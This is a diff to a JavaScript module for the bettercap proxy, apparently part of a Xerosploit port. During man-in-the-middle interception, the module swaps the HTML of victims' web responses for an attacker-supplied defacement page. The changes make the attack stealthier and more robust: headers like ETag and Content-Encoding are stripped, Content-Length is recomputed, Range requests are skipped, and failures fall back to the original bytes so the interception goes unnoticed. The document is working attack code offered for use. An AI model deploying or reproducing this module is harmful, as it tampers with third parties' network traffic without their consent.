@@ -13,8 +13,15 @@
 // Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
 //   XE_TARGET_FILE  absolute path of the defacement HTML page.
 //
-// Strict passthrough: anything that is not text/html is left untouched, and
-// any error is swallowed so proxied traffic is never broken.
+// FAIL-OPEN BODY DISCIPLINE (bettercap v2): res.ReadBody() flips bettercap's
+// "body modified" flag, so after the body has been read this module MUST write
+// a body back or bettercap emits an EMPTY response.  The decision to rewrite
+// is therefore made from method/status/headers alone; only then is the body
+// read exactly once.  Every exit path after that read sets the body and a
+// Content-Length equal to the UTF-8 byte length of the string it writes:
+// either the defacement bytes, or the byte-exact original on failure.
+// GET + status 200 + no Range/Content-Range only; RANGE/206 responses are never
+// touched.  A response this module does not handle is left byte-identical.
 //
 // Released under the GNU GPLv3.
 // Original Xerosploit: LionSec / Neodrix.
@@ -43,6 +50,55 @@ function xeByteLen(s) {
     return n;
 }
 
+// Case-insensitive read from a bettercap header map (req.Headers / res.Headers).
+function xeGetHeader(headers, name) {
+    if (!headers) { return null; }
+    var want = ("" + name).toLowerCase();
+    var key;
+    for (key in headers) {
+        if (("" + key).toLowerCase() === want) {
+            var value = headers[key];
+            if (value === null || value === undefined) { return null; }
+            return value;
+        }
+    }
+    return null;
+}
+
+// Decide, from method/status/headers ALONE (no body read), whether this
+// response may be rewritten as a full-body 200.
+function xeSkipResponse(req, res) {
+    if (!req || req.Method !== "GET") { return true; }
+    if (!res || res.Status !== 200) { return true; }
+    if (xeGetHeader(req.Headers, "Range")) { return true; }
+    if (xeGetHeader(res.Headers, "Content-Range")) { return true; }
+    return false;
+}
+
+var XE_STALE_HEADERS = [
+    "Content-Range", "Accept-Ranges", "ETag", "Last-Modified", "Digest",
+    "Content-MD5", "Content-Disposition", "Content-Encoding", "Transfer-Encoding"
+];
+
+function xeWriteBody(res, body) {
+    res.Body = body;
+    if (typeof res.SetHeader === "function") {
+        res.SetHeader("Content-Length", "" + xeByteLen(body));
+    }
+}
+
+function xeReplaceBody(res, body, contentType) {
+    if (typeof res.RemoveHeader === "function") {
+        for (var i = 0; i < XE_STALE_HEADERS.length; i++) {
+            res.RemoveHeader(XE_STALE_HEADERS[i]);
+        }
+    }
+    if (contentType && typeof res.SetHeader === "function") {
+        res.SetHeader("Content-Type", contentType);
+    }
+    xeWriteBody(res, body);
+}
+
 function xeIsHtml(res) {
     return !!res && typeof res.ContentType === "string" &&
         res.ContentType.toLowerCase().indexOf("text/html") === 0;
@@ -53,15 +109,10 @@ function xeReadFile(path) {
     try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
 }
 
-function xeSetBody(res, body) {
-    res.Body = body;
-    if (typeof res.SetHeader === "function") {
-        res.SetHeader("Content-Length", "" + xeByteLen(body));
-    }
-    if (typeof res.RemoveHeader === "function") {
-        res.RemoveHeader("Content-Encoding");
-        res.RemoveHeader("Transfer-Encoding");
-    }
+function xeReadBody(res) {
+    if (!res) { return null; }
+    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
+    return res.Body;
 }
 
 function onLoad() {
@@ -70,23 +121,34 @@ function onLoad() {
 }
 
 function onResponse(req, res) {
+    // Decide from headers/URL only; a skipped response is never read or mutated.
+    if (!xeIsHtml(res)) { return; }
+    if (xeSkipResponse(req, res)) { return; }
+
+    var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
+    if (!target) { xeWarn("XE_TARGET_FILE is not set; passing through"); return; }
+
+    var payload = xeReadFile(target);
+    if (payload === null || payload === "") { xeWarn("empty defacement file: " + target); return; }
+
+    // Committed to rewriting: read the body exactly once and always write back.
+    var original = null;
     try {
-        if (!xeIsHtml(res)) { return; }                                  // strict passthrough
+        original = xeReadBody(res);
+        if (typeof original !== "string") { return; }
 
-        var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
-        if (!target) { xeWarn("XE_TARGET_FILE is not set; passing through"); return; }
-
-        var payload = xeReadFile(target);
-        if (payload === null || payload === "") { xeWarn("empty defacement file: " + target); return; }
-
-        var where = (req && req.Host ? req.Host : "") + (req && req.Path ? req.Path : "");
+        var where = (req && req.Hostname ? req.Hostname : "") + (req && req.Path ? req.Path : "");
         xeLog("defacing " + where + " with " + target);
 
-        if (typeof res.SetHeader === "function") {
-            res.SetHeader("Content-Type", "text/html; charset=utf-8");
+        if (payload !== original) {
+            xeReplaceBody(res, payload, "text/html; charset=utf-8");
+        } else {
+            xeWriteBody(res, original);
         }
-        xeSetBody(res, payload);
     } catch (e) {
-        xeWarn("onResponse failed: " + e);                               // never break traffic
+        xeWarn("onResponse failed: " + e);
+        if (typeof original === "string") {
+            xeWriteBody(res, original);                                  // fail-open: exact original bytes
+        }
     }
 }
